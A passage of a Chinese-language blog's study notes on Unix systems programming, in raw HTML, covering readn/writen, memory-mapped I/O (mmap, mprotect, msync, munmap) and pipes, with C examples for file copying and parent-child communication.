class="hljs-type">size_t</span> nbytes)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">writen</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> nbytes)</span>;<br><br>Both returns:number of bytes read or written, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">readn</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> n)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> nleft;<br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    nleft = n; <span class="hljs-comment">//剩余需要读的字节数</span><br>    <span class="hljs-keyword">while</span>(nleft &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> ((nread = read(fd, ptr, nleft)) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (nleft == n)<br>                <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        nleft -= nread;<br>        ptr += nread;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(n - nleft);<br>&#125;<br><br><span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">writen</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> n)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> nleft;<br>    <span class="hljs-type">ssize_t</span> nwritten;<br><br>    nleft = n;<br>    <span class="hljs-keyword">while</span> (nleft &gt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span> ((nwritten = write(fd, ptr, nleft)) &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (nleft == n)<br>                <span class="hljs-keyword">return</span>(<span class="hljs-number">-1</span>);<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nwritten == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        nleft -= nwritten;<br>        ptr += nwritten;<br>    &#125;<br>    <span class="hljs-keyword">return</span>(n - nleft);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Memory-Mapped-I-x2F-O"><a href="#Memory-Mapped-I-x2F-O" class="headerlink" title="Memory-Mapped I&#x2F;O"></a>Memory-Mapped I&#x2F;O</h3><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>内存映射<code>I/O</code>允许我们将磁盘上的文件映射到内存中的缓冲区，当从缓存区获取字节时，文件的相应字节就会被读取。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmanh&gt;</span></span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flag, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> off)</span>;<br>Returns:starting address of mapped region <span class="hljs-keyword">if</span> OK,MAP_FAILED on error<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230204133015594.png" alt="image-20230204133015594"></p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230204133236552.png" alt="image-20230204133236552"></p><p><code>flag</code>可选值</p><ul><li><code>MAP_FIXED</code>：返回值必须等于<code>addr</code></li><li><code>MAP_SHARED</code>：对映射内存的操作会同步到文件中</li><li><code>MAP_PRIVATE</code>：对映射内存的操作会同步到私有副本中</li></ul><p><code>addr</code>与<code>off</code>的值需要与页对齐</p><p>有两个信号常用于映射区域</p><ul><li><code>SIGSEGV</code>：试图访问对我们不可用的内存</li><li><code>SIGBUS</code>：访问没有意义的部分内存</li></ul><p>内存映射区域可以通过<code>fork</code>继承，但是不会通过<code>exec</code>继承</p><h4 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h4><p>可以通过<code>mprotect</code>函数修改现存的映射区域的权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br><br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK,<span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><code>prot</code>参数与<code>mmap</code>的一样，<code>addr</code>需要与页对齐</p><h4 id="msync"><a href="#msync" class="headerlink" title="msync"></a>msync</h4><p>用于将映射区域内的数据同步到文件中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">msync</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> flags)</span>;<br><br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><code>flag</code>参数</p><ul><li><code>MS_ASYNC</code>简单地安排要写入的页面</li><li><code>MS_SYNC</code>在返回之前等待写入完成</li><li>可选标志<code>MS_INVALIDATE</code>允许告诉操作系统丢弃与底层存储不同步的任何页面。</li></ul><h4 id="munmap"><a href="#munmap" class="headerlink" title="munmap"></a>munmap</h4><p>取消映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">munmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> len)</span>;<br><br>Returns:<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><strong>example</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>FILE_MODE(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COPYINCR (1024*1024*1024)</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> fdin, fdout;<br>    <span class="hljs-type">void</span> *src, *dst;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">sbuf</span>;</span><br>    <span class="hljs-type">size_t</span> copysz;<br>    <span class="hljs-type">off_t</span> fsz = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;usage: %s &lt;froomfiile&gt; &lt;tofiile&gt;&quot;</span>,argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((fdin = open(argv[<span class="hljs-number">1</span>], O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t create %s for writing&quot;</span>, argv[<span class="hljs-number">2</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((fdout = open(argv[<span class="hljs-number">2</span>], O_RDWR | O_CREAT | O_TRUNC, FILE_MODE))&lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t create %s for writing&quot;</span>,argv[<span class="hljs-number">2</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fstat(fdin, &amp;sbuf) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fstat error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (ftruncate(fdout, sbuf.st_size) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//用于截断文件</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;ftruncate error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (fsz &lt; sbuf.st_size)&#123;<br>        <span class="hljs-keyword">if</span> ((sbuf.st_size - fsz) &gt; COPYINCR)<br>            copysz = COPYINCR;<br>        <span class="hljs-keyword">else</span><br>            copysz = sbuf.st_size - fsz;<br>        <span class="hljs-keyword">if</span> ((src = mmap(<span class="hljs-number">0</span>, copysz, PROT_READ, MAP_SHARED, fdin, fsz)) == MAP_FAILED)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;mmap error for input&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((dst = mmap(<span class="hljs-number">0</span>, copysz, PROT_READ | PROT_WRITE,MAP_SHARED,fdout,fsz)) == MAP_FAILED)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;mmap error for output&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">memcpy</span>(dst, src, copysz);<br>        munmap(src, copysz);<br>        munmap(dst, copysz);<br>        fsz += copysz;<br>        <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);    <br>&#125;<br></code></pre></td></tr></table></figure><h1 id="进程间通信（IPC）"><a href="#进程间通信（IPC）" class="headerlink" title="进程间通信（IPC）"></a>进程间通信（IPC）</h1><h2 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h2><p>管道有两个限制</p><ul><li>半双工通信，数据流只有一个方向</li><li>管道只能在具有共同祖先的进程之间使用</li></ul><p><code>FIFOs</code>绕过了第二个限制，而<code>Socket</code>绕过了上诉两个限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe</span><span class="hljs-params">(<span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>])</span>;<br><br>Returns: <span class="hljs-keyword">if</span> OK, <span class="hljs-number">-1</span> on error<br></code></pre></td></tr></table></figure><p><code>fstat</code>函数针对管道文件返回<code>FIFO</code>类型，可以通过<code>S_ISFIFP</code>宏获取。</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230207234736511.png" alt="image-20230207234736511"></p><p>父进程关闭<code>fd[0]</code>读管道，子进程关闭<code>fd[1]</code>写管道，则父进程只往管道中写，而子进程只从管道中读数据。</p><p><img src="https://gitee.com/h0pe-ay/blogimages/raw/master/image-20230207234928683.png" alt="image-20230207234928683"></p><p>两个应用于管道的规则</p><ol><li>当写管道关闭时，读管道会读到文件末尾，并返回已经读了的数据。</li><li>当读管道关闭时，写管道往管道中写会发出<code>SIGPIPE</code>信号。默认的信号处理为返回<code>-1</code>并设置<code>errno</code>为<code>EPIPE</code></li></ol><p><code>PIPE_BUF</code>为管道缓冲区的常量值，写入少于该值时不会覆盖其他管道的缓冲区，但是超过该值则会覆盖其余管道的缓冲区。</p><p><strong>父进程传字符串到子进程</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><span class="hljs-type">int</span> <br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br><br>    <span class="hljs-keyword">if</span> (pipe(fd) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pipe error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<span class="hljs-string">&quot;fork error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>)&#123;<br>        close(fd[<span class="hljs-number">0</span>]); <span class="hljs-comment">//父进程写</span><br>        write(fd[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;hello world\n&quot;</span>,<span class="hljs-number">12</span>);<br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">/* code */</span><br>        close(fd[<span class="hljs-number">1</span>]);<span class="hljs-comment">//子进程读</span><br>        n = read(fd[<span class="hljs-number">0</span>], line, MAXLINE);<br>        write(STDOUT_FILENO, line, n);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>实现管道功能，读指定文件并输入到more程序中</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_PAGE <span class="hljs-string">&quot;/bin/more&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 1024</span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">char</span> *pager, *argv0;<br>    <span class="hljs-type">char</span> line[MAXLINE];<br>    FILE *fp;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usgae: a.out &lt;pathname&gt;&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((fp = fopen(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;can&#x27;t open %s&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (pipe(fd) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;pipe error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork error!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>)&#123; <br>        close(fd[<span class="hljs-number">0</span>]);<span class="hljs-comment">//父进程写</span><br>        <span class="hljs-keyword">while</span>  (fgets(line, MAXLINE, fp) != <span class="hljs-literal">NULL</span>)&#123; <span class="hljs-comment">//从文件中逐行读取内容</span><br>            n = <span class="hljs-built_in">strlen</span>(line); <span class="hljs-comment">// 获取字符长度</span><br>            <span class="hljs-keyword">if</span> (write(fd[<span class="hljs-number">1</span>], line, n) != n) <span class="hljs-comment">//写进管道内</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;write error to pipe&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>        &#125;<br>            <span class="hljs-keyword">if</span> (ferror(fp))<br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fgets error&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            close(fd[<span class="hljs-number">1</span>]); <span class="hljs-comment">//写完关闭写管道</span><br>            <span class="hljs-keyword">if</span> (waitpid(pid, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//等待子进程</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;waitpid error&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        close(fd[<span class="hljs-number">1</span>]); <span class="hljs-comment">//子进程读管道</span><br>        <span class="hljs-keyword">if</span> (fd[<span class="hljs-number">0</span>] != STDIN_FILENO) <br>        &#123;<br>            <span class="hljs-keyword">if</span> (dup2(fd[<span class="hljs-number">0</span>], STDIN_FILENO) != STDIN_FILENO)<span class="hljs-comment">//将管道描述符复制给STDIN_FILENO,然后close(fd[0])</span><br>            &#123;<br>                <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;dup2 error!\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            close(fd[<span class="hljs-number">0</span>]);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((pager = getenv(<span class="hljs-string">&quot;PAGER&quot;</span>) == <span class="hljs-literal">NULL</span>))<br>            pager = DEF_PAGE;<br>        <span class="hljs-keyword">if</span> ((argv0 = <span class="hljs-built_in">strrchr</span>(pager, <span class="hljs-string">&#x27;/&#x27;</span>)) != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//从后往前搜索&#x27;/&#x27;</span><br>            argv0++;<br>        <span class="hljs-keyword">else</span><br>            argv0 = pager;<br>        <span class="hljs-keyword">if</span> (execl(pager, argv0, (<span class="hljs-type">char</span> *)<span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;execl error for %s&quot;</span>, pager);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>利用管道实现父子进程信号同步</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 